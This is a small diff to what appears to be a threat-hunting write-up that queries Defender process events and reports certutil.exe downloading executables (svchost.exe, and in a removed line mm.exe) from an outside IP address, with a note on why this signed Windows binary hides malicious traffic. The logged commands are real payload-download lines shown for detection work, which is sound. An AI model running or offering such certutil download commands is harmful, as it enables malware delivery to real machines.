@@ -291,10 +291,9 @@ DeviceProcessEvents
 | order by Timestamp asc
 ```
 
-Results show:
+Result show:
 
 - `certutil.exe -urlcache -f http://78.141.196.6:8080/svchost.exe ...`  
-- `certutil.exe -urlcache -f http://78.141.196.6:8080/mm.exe ...`
 
 **Why it matters**  
 `certutil.exe` is a signed Windows binary (LOLBAS). Using it for downloads blends malicious traffic with legitimate administration activity.
